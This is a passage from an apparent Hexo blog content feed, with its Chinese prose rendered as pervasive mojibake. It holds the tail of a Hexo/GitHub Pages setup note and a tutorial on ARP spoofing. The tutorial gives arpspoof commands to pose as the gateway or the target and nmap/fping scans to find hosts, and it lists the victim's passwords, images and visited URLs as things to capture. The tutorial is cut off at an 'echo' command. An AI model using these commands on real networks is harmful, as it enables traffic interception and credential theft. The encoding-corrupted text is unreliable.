blog<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯åœ¨powershellå½“å‰çš„æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºblogçš„æ–‡ä»¶å¤¹ï¼Œç”¨äºåç»­é…ç½®æ–‡ä»¶çš„å­˜æ”¾ã€‚</p><p>[<em>blog</em>]å¥½åƒå¯ä»¥å¡«åˆ«çš„æ–‡ä»¶åï¼Œä½†æˆ‘æ²¡è¯•è¿‡æ‰€ä»¥ä¸å»ºè®®ã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>å»ºå¥½æ–‡ä»¶å¤¹ä¹‹ååˆå§‹åŒ–é…ç½®</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#è¿›å…¥blogæ–‡ä»¶å¤¹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤ç»“æŸä»¥åå°±å¯ä»¥çœ‹åˆ°blogæ–‡ä»¶å¤¹é‡Œæœ‰å¾ˆå¤šæ–‡ä»¶å–½ï¼Œç±»ä¼¼äºä¸‹å›¾è¿™æ ·ã€‚</p><p>å›¾ç‰‡é‡Œæœ‰äº›æ–‡ä»¶ä½ æ²¡æœ‰ä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘å»ºæˆåšå®¢åˆä¸‹è½½äº†å¾ˆå¤šä¸œè¥¿ä¹‹åè¡¥æˆªçš„å›¾ã€‚ğŸ˜³</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>ä¸¤æ¡å‘½ä»¤ç”Ÿæˆç½‘é¡µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>å½“ç„¶å–½hexoå–„è§£äººæ„åœ°æ”¯æŒç®€å†™ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥ <code>hexo g</code>å’Œ<code>hexo s</code></p><p>ç”¨æµè§ˆå™¨é¢„è§ˆç½‘å€<a href="http://localhost:4000/">http://localhost:4000</a></p><p>å› ä¸ºæˆ‘ä»¬è¿˜æ²¡é…ç½®GitHubæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±æ˜¯Hexoæœ€åŸºç¡€çš„ä¸‘é™‹é¡µé¢ã€‚</p><h4 id="è¸©å‘-1"><a href="#è¸©å‘-1" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p>cmdé‡Œè¾“å…¥hexoå‘½ä»¤ååˆæŠ¥é”™</p><p>è¯´hexoä¸æ˜¯å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ï¼Œç™¾åº¦åå‘ç°æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ï¼Œ<del>è¯¥æ­»çš„ç¯å¢ƒå˜é‡</del></p><p>å‘ç°hexo-cliçš„binç›®å½•ä¸‹æ²¡æœ‰.cmdçš„æ–‡ä»¶ï¼Œä½†æ˜¯å‰ä¸€ä¸ªç›®å½•é‡Œæœ‰ï¼Œå°±ç›´æ¥å¤åˆ¶è¿‡æ¥ï¼ŒåˆæŠŠbinæ·»åŠ åˆ°äº†ç¯å¢ƒå˜é‡é‡Œï¼Œå†hexo init</p><p>è¿è¡ŒæˆåŠŸä½†æŠ¥é”™ï¼Œ<del>æƒ³æ­»</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>æ®è¯´æ˜¯å› ä¸ºç›®å½•ä¸‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œ<del>ä¸ºä»€ä¹ˆåº”è¯¥æœ‰hexoçš„æ–‡ä»¶å¤¹å•Š</del></p><p>æ¢ä¸ªæ€è·¯ï¼Œç”¨ç®¡ç†å‘˜æ¨¡å¼é‡æ–°ä¸‹è½½hexoï¼ˆæˆ‘å°±ä¸ªé‡åˆ°å›°éš¾å¸è½½åˆ é™¤çš„èœé¸¡ğŸ˜¶â€ğŸŒ«ï¸</p><p>ä¸‹è½½åè¿è¡Œ<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>åˆä¸€æ¬¡å‘ä¸‡èƒ½çš„äº’è”ç½‘æ±‚åŠ©ï¼Œä¿®æ”¹äº†ä¸€ä¸‹power shellçš„æƒé™ï¼Œå†è¿è¡Œ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>æˆåŠŸï¼ˆï¼Ÿï¼Ÿï¼‰</p><blockquote><p>ç®¡ç†å‘˜æ¨¡å¼yyds</p></blockquote><h2 id="GitHubé…ç½®ç½‘é¡µ"><a href="#GitHubé…ç½®ç½‘é¡µ" class="headerlink" title="GitHubé…ç½®ç½‘é¡µ"></a>GitHubé…ç½®ç½‘é¡µ</h2><p>åœ¨GitHubé‡Œå»ºä¸€ä¸ª<strong>ç”¨æˆ·å.github.io</strong>çš„ä»“åº“ï¼Œå»ºå¥½ä»¥åç‚¹å‡»pageæŠŠè¿™ä¸ªåº“å˜æˆä¸€ä¸ªç½‘é¡µã€‚</p><p>æˆ‘ä»¬åœ¨å‘½ä»¤è¡Œè¾“å…¥<code>hexo d</code> æ—¶é»˜è®¤ä¸Šä¼ <strong>master</strong>åˆ†æ”¯ï¼Œä½†æ˜¯åœ¨GitHubé¡µé¢é»˜è®¤<strong>main</strong>åˆ†æ”¯ï¼Œéœ€è¦æ”¹æˆmasterã€‚æ²¡æœ‰ä¸‹æ‹‰é€‰é¡¹ï¼Œè¦æ‰‹åŠ¨è¾“å…¥</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™å…ˆåˆ«hexo dï¼Œä¼šæŠ¥é”™ï¼Œå› ä¸ºè¿˜æ²¡è¿æ¥GitHubå’Œhexoã€‚</p><p>è¿™æ—¶å€™ä½ åœ¨æµè§ˆå™¨æœç´¢<code>https://ç”¨æˆ·å.github.io</code>ï¼Œå‡ºç°ä»“åº“çš„è‡ªè¿°æ–‡ä»¶å°±æ˜¯æˆåŠŸå•¦ã€‚</p><h2 id="SSHè¿æ¥GitHub"><a href="#SSHè¿æ¥GitHub" class="headerlink" title="SSHè¿æ¥GitHub"></a>SSHè¿æ¥GitHub</h2><p>ä¹Ÿæ˜¯é»˜è®¤å¤§å®¶æœ‰è¿™ç©æ„çš„å“ˆ</p><p>åœ¨gité‡Œé¢è¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>æŒ‰å›è½¦ä¹‹åä¼šæç¤ºè¾“å…¥å†…å®¹ï¼Œå¯ä»¥å…¨éƒ¨æŒ‰å›è½¦ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤çš„<code>~/.ssh</code>æ–‡ä»¶ç›®å½•å­˜æ”¾å¯†é’¥ï¼Œä»¥åŠä¸è®¾ç½®å¯†é’¥çš„å¯†ç ã€‚</p><p>åœ¨æ–‡ä»¶å¤¹é‡Œæ‰¾åˆ°.sshæ–‡ä»¶ï¼Œæ‰¾åˆ°é‡Œé¢çš„å¯†é’¥å¤åˆ¶åˆ°GitHubã€‚åœ¨ä¸ªäººè®¾ç½®é¡µé¢çš„SSH and GPG keys æ·»åŠ </p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>å†æ‰“å¼€gitè¾“å…¥è¿æ¥å‘½ä»¤</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 id="Hexoå†…éƒ¨æ“ä½œ"><a href="#Hexoå†…éƒ¨æ“ä½œ" class="headerlink" title="Hexoå†…éƒ¨æ“ä½œ"></a>Hexoå†…éƒ¨æ“ä½œ</h2><h3 id="å†™ä½œ"><a href="#å†™ä½œ" class="headerlink" title="å†™ä½œ"></a>å†™ä½œ</h3><p><strong>åœ¨blogæ–‡ä»¶å¤¹é‡Œæ“ä½œ</strong></p><p>åˆ›å»ºæ–°æ–‡ç« </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;æ–‡ç« æ ‡é¢˜&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>è¿˜ä¼šè´´å¿ƒçš„å‘Šè¯‰ä½ å»ºåœ¨å“ªé‡Œäº†</p><blockquote><p>å®ƒçœŸçš„ï¼Œæˆ‘å“­æ­»</p></blockquote><p>ä¹‹åå°±å¯ä»¥åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œçœ‹åˆ°ä»¥â€œæ–‡ç« æ ‡é¢˜â€å‘½åçš„mdæ–‡ä»¶ï¼Œåœ¨é‡Œé¢ä¿®æ”¹ä¹‹åå†è¿è¡Œ<code>hexo g</code>å’Œ<code>hexo s</code>å°±èƒ½åœ¨é¢„è§ˆç½‘é¡µçœ‹åˆ°åˆšå‘çš„æ–‡æ¡£å•¦ã€‚</p><blockquote><p>è¿™ä¸€è¶´æ— è„‘è·Ÿæ•™ç¨‹èµ°æ²¡è¸©é›·ï¼Œæˆ‘åˆæ´»äº†ğŸ¥³</p></blockquote><h5 id="é…ç½®ç¯èŠ‚"><a href="#é…ç½®ç¯èŠ‚" class="headerlink" title="é…ç½®ç¯èŠ‚"></a>é…ç½®ç¯èŠ‚</h5><p>é…ç½®æ–‡ä»¶[-config.yml]</p><p><code>title</code>ä¿®æ”¹ç½‘é¡µå¯¼èˆªæ æ ‡ç­¾</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>è®©ç½‘é¡µå’ŒGitHubè”å§»</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>æ”¹ä¸»é¢˜ï¼Œç›´æ¥å¤åˆ¶ä¸»é¢˜åå­—å°±å¥½</p><h4 id="è¸©å‘-2"><a href="#è¸©å‘-2" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p><code>hexo d</code>æŠŠå†™ä½œéƒ¨ç½²åˆ°GitHubä¸Šï¼ŒåˆæŠ¥é”™å•¦å“ˆå“ˆå“ˆ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>ä¸‡èƒ½çš„äº’è”ç½‘è¯´è¿™ä¸ªå«æ˜ å°„æ¡ç›®ç¼©è¿›é”™è¯¯ï¼Œæ”¹äº†å¥½å‡ éç¼©è¿›éƒ½ä¸å¯¹</p><p>è¿˜ç¢°åˆ°äº†ä¸€ä¸ªé”™è¯¯</p><blockquote><p>(101.1)é”™è¯¯çš„æ„æ€æ˜¯ç¬¬101è¡Œä¸å‰æ–‡é‡å¤ï¼ŒæŠŠè¿™ä¸€è¡Œæ³¨é‡Šæ‰å°±è¡Œ</p></blockquote><p>æœ€åæ”¹æˆè¿™æ ·è¿è¡ŒæˆåŠŸ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>ä½†æ˜¯æŸ¥çœ‹<a href="https://shmodifier.github.ioè¿˜æ˜¯ä¸æˆåŠŸ/">https://ShModifier.github.ioè¿˜æ˜¯ä¸æˆåŠŸ</a></p><p>åæ¥å‘ç°æˆ‘è¿™èªæ˜çš„å°è„‘ç“œæŠŠä¿¡æ¯æ”¾é”™äº†ä½ç½®ğŸƒ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>æ”¹æˆè¿™æ ·å°±å¥½å•¦</p><hr><p>æŠŠæ­åšå®¢çš„ç¬”è®°å‘ä¸Šæ¥ï¼Œç»™å¤§å®¶çœ‹çœ‹ç¬‘è¯â˜ƒï¸</p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºARPæ¬ºéª—å’ŒARPæ”»å‡»</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>è¶ç€å¯’å‡å·å·å·å“ˆå“ˆå“ˆğŸ¤ª</p><span id="more"></span><h3 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h3><p>åœ°å€è§£æåè®®ï¼Œå³ARPï¼ˆAddress Resolution Protocolï¼‰ï¼Œæ˜¯æ ¹æ®IPåœ°å€è·å–ç‰©ç†åœ°å€çš„ä¸€ä¸ªTCP&#x2F;IPåè®®ã€‚</p><blockquote><p>æ¯ä¸€å°ä¸»æœºéƒ½æœ‰ä¸€ä¸ªarpé«˜é€Ÿç¼“å­˜ï¼Œé‡Œé¢æœ‰æœ¬å±€åŸŸç½‘ä¸­çš„å„ä¸»æœºå’Œè·¯ç”±å™¨çš„IPåœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„è¡¨</p></blockquote><h4 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h4><p>ä¸»æœºAå’Œä¸»æœºBå„è‡ªæœ‰è‡ªå·±çš„IPåœ°å€å’ŒMACåœ°å€ï¼Œåœ¨ä¸»æœºAä¸ä¸»æœºBé€šä¿¡æ—¶ï¼ŒARPåè®®å¯å°†ä¸»æœºBçš„IPåœ°å€è§£æä¸ºMACåœ°å€ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼š</p><p>ä¸»æœºAé¦–å…ˆç¡®å®šç”¨äºè®¿é—®ä¸»æœºBçš„IPåœ°å€ï¼Œç„¶åä¸»æœºAåœ¨è‡ªå·±çš„æœ¬åœ°ARPç¼“å­˜ä¸­æ£€æŸ¥ä¸»æœºBçš„IPåœ°å€åŒ¹é…çš„MACåœ°å€</p><p>ç¬¬äºŒæ­¥ï¼š</p><p>å¦‚æœä¸»æœºAåœ¨ARPç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°ä¸»æœºBçš„IPæ˜ å°„ï¼Œå®ƒå°†è¯¢é—®ä¸»æœºBå¯¹åº”çš„ç¡¬ä»¶åœ°å€ï¼Œä¼šå°†ARPè¯·æ±‚å¸§å¹¿æ’­åˆ°æœ¬åœ°ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºï¼Œä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€éƒ½åŒ…æ‹¬åœ¨ARPè¯·æ±‚ä¸­ã€‚æœ¬åœ°ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½æ¥å—åˆ°ARPè¯·æ±‚å¹¶æ£€æŸ¥æ˜¯å¦ä¸è‡ªå·±çš„IPåœ°å€åŒ¹é…ã€‚å¦‚æœä¸»æœºå‘ç°è¯·æ±‚çš„IPåœ°å€ä»¥è‡ªå·±çš„IPåœ°å€ä¸åŒ¹é…ï¼Œä»–å°†ä¸¢å¼ƒARPè¯·æ±‚ã€‚</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>ç¬¬ä¸‰æ­¥ï¼š</p><p>ä¸»æœºBç¡®å®šAARPè¯·æ±‚ä¸­çš„IPåœ°å€äºè‡ªå·±çš„IPåœ°å€åŒ¹é…ï¼Œå¹¶å°†ä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ·»åŠ åˆ°æœ¬åœ°ARPç¼“å­˜ä¸­ã€‚</p><p>ç¬¬å››æ­¥ï¼š</p><p>ä¸»æœºBå°†åŒ…å«MACåœ°å€çš„ARPå›å¤æ¶ˆæ¯ç›´æ¥å‘é€åˆ°ä¸»æœºA</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>ç¬¬äº”æ­¥ï¼š</p><p>å½“ä¸»æœºAæ”¶åˆ°ä»ä¸»æœºBå‘æ¥çš„ARPå›å¤æ¶ˆæ¯æ—¶ï¼Œä¼šä½¿ç”¨ä¸»æœºBçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ›´æ–°ARPç¼“å­˜ã€‚æœ¬æœºç¼“å­˜æ˜¯æœ‰ç”Ÿå­˜æœŸçš„ï¼Œç”Ÿå­˜æœŸç»“æŸï¼Œå°†å†æ¬¡é‡å¤ä¸Šé¢çš„å†…å®¹ã€‚ä¸»æœºBçš„MACåœ°å€ä¸€æ—¦ç¡®å®šï¼Œä¸»æœºAå°±èƒ½å‘ä¸»æœºBå‘é€IPé€šä¿¡äº†ã€‚</p><h4 id="å‘½ä»¤çª—å£ç©è½¬ARP"><a href="#å‘½ä»¤çª—å£ç©è½¬ARP" class="headerlink" title="å‘½ä»¤çª—å£ç©è½¬ARP"></a>å‘½ä»¤çª—å£ç©è½¬ARP</h4><p>è¾“å…¥<code>arp</code>æç¤ºä½¿ç”¨æ–¹æ³•</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æ€»æ˜¯è¯´â€œâ€™ARPâ€™ä¸æ˜¯å¯æ‰§è¡Œçš„ç¨‹åºâ€ï¼Œå‡­æˆ‘è¸©å‘ç»éªŒçŸ¥é“è¿™æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ã€‚è´¹å°½åƒè¾›ä¸‡è‹¦å‘ç°æ˜¯å› ä¸ºæˆ‘çš„ç¯å¢ƒå˜é‡é‡Œå±…ç„¶æ²¡æœ‰system32ğŸ¥²ã€‚ä½†æ˜¯è¾“å…¥pathæŸ¥çœ‹æ˜¯æœ‰å®ƒçš„ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ï¼ŒåŠ ä¸Šä¹‹åé‡å¯å°±å¥½å•¦</p></blockquote><p>è¾“å…¥<code>arp -a</code>æŸ¥çœ‹ARPç¼“å­˜è¡¨ä¿¡æ¯</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>é™æ€</strong>åœ°å€å³ä¸»æœºè‡ªå·±é…ç½®ç”Ÿæˆçš„åœ°å€ã€‚</p><p>å½“ä¸»æœºæ–°è¿æ¥å…¥ä¸€å°è®¾å¤‡ï¼Œå¹¶ä¸”ä¸ä¸»æœºäº§ç”Ÿé€šä¿¡åï¼Œaqpè¡¨ä¼šæ›´æ–°ä¸€æ¡<strong>åŠ¨æ€</strong>åœ°å€ã€‚</p><h3 id="ARPæ”»å‡»"><a href="#ARPæ”»å‡»" class="headerlink" title="ARPæ”»å‡»"></a>ARPæ”»å‡»</h3><p>ARPæ”»å‡»å°±æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œä½¿å¾—ç½‘ç»œæ— æ³•æ­£å¸¸é€šä¿¡ã€‚å³ä¿®æ”¹é¶æœºçš„IPåœ°å€å’ŒMACåœ°å€ï¼Œä½¿å…¶ä»–è®¾å¤‡ä¸é¶æœºçš„é€šä¿¡æ— æ³•æ­£å¸¸è¿›è¡Œï¼Œè¿›è€Œæˆªæ–­é¶æœºæµé‡ã€‚</p><blockquote><p>å¯ä»¥ç›´æ¥ä½¿ç”¨arpspoofæ’ä»¶æ”»å‡»</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[ç›®æ ‡IP]</span> -r <span class="hljs-selector-attr">[ç½‘å…³]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œâ€râ€çš„ç”¨æ³•æ²¡ææ‡‚ğŸ˜£å¥½åƒå°±æ˜¯ç›´æ¥åŒå‘æ”»å‡»</p><p>Ctrl+Cæˆ–å…³é—­ç»ˆç«¯å³åœæ­¢æ”»å‡»</p><h3 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h3><p><del>å¬è¯´ARPæ¬ºéª—é…åˆDNSæ¬ºéª—æ•ˆæœæ›´ä½³</del>ğŸ¤¨</p><h5 id="å¯ä»¥ç”¨æ¥å¹²çš„åäº‹"><a href="#å¯ä»¥ç”¨æ¥å¹²çš„åäº‹" class="headerlink" title="å¯ä»¥ç”¨æ¥å¹²çš„åäº‹"></a>å¯ä»¥ç”¨æ¥å¹²çš„åäº‹</h5><ul><li>è·å–æµè§ˆå›¾ç‰‡</li><li>è·å–é¶æœºå„å¹³å°è¾“å…¥çš„è´¦å·å¯†ç </li><li>è·å–æµè§ˆåœ°å€</li></ul><h5 id="è¡Œéª—æ–¹æ³•"><a href="#è¡Œéª—æ–¹æ³•" class="headerlink" title="è¡Œéª—æ–¹æ³•"></a>è¡Œéª—æ–¹æ³•</h5><h6 id="1-ä¼ªè£…æˆç½‘å…³"><a href="#1-ä¼ªè£…æˆç½‘å…³" class="headerlink" title="1.ä¼ªè£…æˆç½‘å…³"></a>1.ä¼ªè£…æˆç½‘å…³</h6><p>æ¬ºéª—æºæŠŠè‡ªå·±ä¼ªè£…æˆç½‘å…³ï¼Œå‘å±€åŸŸç½‘å†…çš„ç›®æ ‡ä¸»æœºå‘é€ARPæŠ¥æ–‡ï¼Œä½¿å¾—å±€åŸŸç½‘å†…çš„ä¸»æœºè¯¯ä»¥ä¸ºæ¬ºéª—æºçš„MACåœ°å€æ˜¯ç½‘å…³MACåœ°å€ï¼Œå¹¶å°†åŸæœ¬åº”è¯¥æµå‘ç½‘å…³çš„æ•°æ®éƒ½å‘é€åˆ°æ¬ºéª—æºã€‚</p><blockquote><p>ç›´æ¥å¯¹é¶æœºå®æ–½ARPæ¬ºéª—</p></blockquote><h6 id="2-ä¼ªè£…æˆä¸»æœº"><a href="#2-ä¼ªè£…æˆä¸»æœº" class="headerlink" title="2.ä¼ªè£…æˆä¸»æœº"></a>2.ä¼ªè£…æˆä¸»æœº</h6><p>ç”¨æ¥æ¬ºéª—å±€åŸŸç½‘å†…çš„å…¶ä»–æ‰€æœ‰ä¸»æœº</p><p>æ¬ºéª—æºå°†è‡ªå·±ä¼ªè£…æˆå±€åŸŸç½‘å†…çš„å¦ä¸€å°ä¸»æœº3ï¼Œå°†ä¸»æœº3çš„IPåœ°å€å¯¹åº”çš„MACåœ°å€æ›¿æ¢ä¸ºæ¬ºéª—å…ƒçš„IPåœ°å€å¯¹åº”çš„MACåœ°å€ä½¿å¾—å±€åŸŸç½‘å†…é¶æœºå‘å¾€ä¸»æœº3çš„æŠ¥æ–‡éƒ½æµå‘æ¬ºéª—æº</p><blockquote><p>åˆ†åˆ«å¯¹ç½‘å…³å’Œé¶æœºå®æ–½ARPæ¬ºéª—</p></blockquote><h3 id="æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰"><a href="#æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰" class="headerlink" title="æ“ä½œæ­¥éª¤ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰"></a>æ“ä½œæ­¥éª¤<del>ï¼ˆè¡Œéª—æ­¥éª¤ï¼‰</del></h3><blockquote><p>ä¼ªè£…æˆç½‘å…³</p></blockquote><p>é¦–å…ˆæŸ¥çœ‹æ¬ºéª—æºå’Œé¶æœºçš„IPåœ°å€</p><ul><li><p>ç›´æ¥æŸ¥çœ‹ï¼škaliå‘½ä»¤çª—å£è¾“å…¥<code>ifconfig</code>ï¼ŒWindowså‘½ä»¤çª—å£è¾“å…¥<code>ipconfig</code></p></li><li><p>æ­£ç»æ–¹æ³•ï¼š</p><p>1.åœ¨kaliå‘½ä»¤çª—å£è¾“å…¥<code>fping -g xxx.xxx.xxx[ç½‘ç»œå·ç ].1/24</code>æŸ¥è¯¢ç›®æ ‡ç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºIP </p><p>2.è¾“å…¥å‘½ä»¤<code>nmap -sP xxx.xxx.xxx[ç½‘ç»œå·ç ].0/24</code>æŸ¥è¯¢ç›®æ ‡ç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºIP</p></li></ul><p>è¾“å…¥å‘½ä»¤<code>route-n</code>æŸ¥çœ‹ç½‘å…³</p><p>ä½¿ç”¨arpspoofè¡Œéª—</p><blockquote><p>kaliå‘½ä»¤çª—å£è¾“å…¥sudo arpspoof -hæŸ¥çœ‹å·²ç»å®‰è£…çš„arpspoofç‰ˆæœ¬å·ï¼Œå¦‚æœæœªå®‰è£…ï¼Œç³»ç»Ÿä¼šå¼¹å‡ºæç¤ºï¼ŒæŒ‰ç…§æç¤ºå®‰è£…å³å¯ </p></blockquote><p>æ–­ç½‘æ“ä½œ</p><p>æŠŠé¶æœºå‘å‡ºçš„è¯·æ±‚æ¥å—åˆ°æ”»å‡»æºä¸»æœºï¼Œå› ä¸ºlinuxé»˜è®¤ip_forwardä¸º0ï¼Œå³ä¸è¿›è¡Œæµé‡è½¬å‘ï¼Œæ‰€ä»¥é¶æœºä¼šæ–­ç½‘</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">è®©é¶æœºè®¤ä¸ºæ”»å‡»æºä¸ºç½‘å…³ï¼š<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span> -t <span class="hljs-selector-attr">[ç›®æ ‡IP]</span> <span class="hljs-selector-attr">[ç½‘å…³]</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…åå‘æ¬ºéª—</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">è®©ç½‘å…³è®¤ä¸ºæ”»å‡»æºæ˜¯é¶æœºï¼š<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span> -t <span class="hljs-selector-attr">[ç½‘å…³]</span> <span class="hljs-selector-attr">[ç›®æ ‡IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>ç½‘å¡é»˜è®¤eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>æŸ¥çœ‹ip_forwardçš„å€¼ã€‚å¦‚æœip_forwardä¸º0ï¼Œåˆ™è¢«æ”»å‡»ä¸»æœºä¸èƒ½ä¸Šç½‘ï¼›å¦‚æœip_forwardä¸º1ï¼Œåˆ™è¢«æ”»å‡»ä¸»æœºå¯ä»¥ä¸Šç½‘</p><p>ä¿®æ”¹æ•°å€¼è®©ä»–ä¸Šç½‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo 